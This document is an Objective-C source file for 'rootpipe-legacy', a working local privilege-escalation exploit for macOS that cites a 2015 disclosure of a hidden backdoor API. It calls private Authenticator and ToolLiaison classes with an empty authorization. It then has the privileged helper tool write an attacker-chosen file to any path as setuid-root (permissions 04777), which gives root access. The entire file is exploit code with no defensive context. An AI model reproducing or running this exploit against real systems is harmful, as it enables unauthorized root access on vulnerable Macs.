#import <Foundation/Foundation.h>
#import <SecurityFoundation/SFAuthorization.h>


#pragma mark -

@interface UserUtilities : NSObject

- (BOOL)createFileWithContents:(NSData *)data path:(NSString *)string attributes:(NSDictionary *)attributes;

@end

@interface Authenticator : NSObject

+ (id)sharedAuthenticator;
- (void)authenticateUsingAuthorizationSync:(SFAuthorization *)authorization;

@end

@interface ToolLiaison : NSObject

+ (id)sharedToolLiaison;
- (UserUtilities *)tool;

@end


#pragma mark -

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe-legacy source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	
	// https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/
	
	Authenticator *authent = [Authenticator sharedAuthenticator];
	
	SFAuthorization *authref = [SFAuthorization authorization];
	
	[authent authenticateUsingAuthorizationSync:authref];
	
	ToolLiaison *st = [ToolLiaison sharedToolLiaison];
	UserUtilities *tool = [st tool];
	
	[tool createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
	
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
